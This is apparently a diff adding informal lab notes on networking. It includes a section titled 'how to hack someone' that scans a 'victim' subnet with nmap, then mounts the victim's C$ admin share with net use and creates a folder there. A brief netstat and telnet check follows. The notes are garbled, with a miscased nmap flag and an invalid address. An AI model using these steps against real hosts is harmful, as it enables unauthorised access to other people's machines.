@@ -1,0 +1,58 @@
+EDGE-51(config)#line vty 0 14
+EDGE-51(config-line)#tra
+EDGE-51(config-line)#transport in
+EDGE-51(config-line)#transport input all
+
+!!!!HOW TO USE 7 OSI LAYERS TO HACK SOMEONE
+
+PICK YOUR VICTIM: nmap -Sp 10.52.1.0/24
+                  nmap -Sp 10.52.1.0/24
+
+!!cmd!!!!
+tcp.flags.syn == 1 && tcp.flags.ack == 0
+
+    !!!!!3 way hand shake!!!!
+socket
+SIP - Source IP ------> 10.51.1.10 (Me)
+DIP - Dest IP   ------> 10.52.1.10 (victim) ----> SYN POCKET
+SPort
+DPort              <------- SYN, ACK -------
+                   ----------ACK ---------->
+            <--------------ESTABLISHED ------->
+
+ cmd
+ping 10.victim.1.10
+nmap -v 10.victim.1.10
+
+PORT     STATE SERVICE
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+902/tcp  open  iss-realsecure
+912/tcp  open  apex-mesh
+5985/tcp open  wsman
+
+c> 
+>net use x: /delete
+>net use \\10.52.1.10\ipc$
+>net use x: \\10.52.1.10\c$
+>x:
+
+!!x: (folder of the victim)
+>mkdir PASOKSI51saYOU
+
+!!!HOW TO CHECK IF YOUR GETTING HACKED!!!
+cmd
+>netstat -s -p tcp
+
+cmd
+>telnet
+
+powershell
+>add-windowsfeatures -name "telnet-client"
+
+cmd
+>telnet 10.51.51.1
+MCUM
+>sh tcp brief
+
